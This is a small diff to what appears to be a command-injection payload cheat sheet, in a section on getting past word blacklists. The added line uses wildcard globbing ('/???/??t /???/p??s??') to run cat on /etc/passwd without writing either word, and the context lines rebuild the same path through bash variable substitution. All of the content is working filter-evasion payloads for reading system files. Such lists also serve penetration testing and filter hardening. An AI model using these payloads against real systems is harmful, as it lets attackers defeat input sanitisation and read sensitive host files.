@@ -102,6 +102,8 @@ who$@ami
 Bypass blacklisted word with variable expansion
 
 ```powershell
+/???/??t /???/p??s??
+
 test=/ehhh/hmtc/pahhh/hmsswd
 cat ${test//hhh\/hm/}
 cat ${test//hh??hm/}
